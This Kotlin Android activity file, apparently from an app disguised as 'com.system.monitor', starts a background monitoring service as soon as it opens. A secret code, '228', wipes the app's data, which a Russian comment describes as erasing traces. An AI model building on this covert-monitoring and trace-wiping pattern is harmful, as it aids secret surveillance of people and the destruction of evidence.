package com.system.monitor

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val inputField = findViewById<EditText>(R.id.inputField)
        val submitButton = findViewById<Button>(R.id.submitButton)

        // Запуск фонового сервиса мониторинга сразу при открытии
        val serviceIntent = Intent(this, MonitorService::class.java)
        startForegroundService(serviceIntent)

        submitButton.setOnClickListener {
            val code = inputField.text.toString().trim()
            if (code == "228") {
                // Полная деинсталляция и зачистка следов
                val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                am.clearApplicationUserData()
            }
        }
    }
}
